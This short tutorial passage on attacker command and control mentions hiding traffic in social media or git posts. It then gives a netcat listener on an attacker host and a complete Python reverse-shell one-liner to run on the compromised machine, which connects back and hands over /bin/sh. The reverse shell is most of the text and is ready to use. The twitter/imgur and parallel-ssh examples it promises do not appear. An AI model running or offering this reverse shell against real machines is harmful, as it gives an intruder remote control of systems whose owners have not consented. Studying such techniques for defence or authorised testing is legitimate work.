# Command and Control
Attackers use available services on compromised machines to issue commands, which might include communication through open sockets, hide communication through posts to social media & blogging sites or git repositories.

Here, we illustrate command and control (C2) using twitter/imgur posts or simply parallel-ssh.

For a simple example using netcat and python sockets, an attacker on 192.168.1.3 listens on port 1234 with:
```
nc -l 192.168.1.3 1234
```

Now on the compromised machine, run the following:
# on attacked machine, have this running to open shell on attacking machine
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.1.3",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

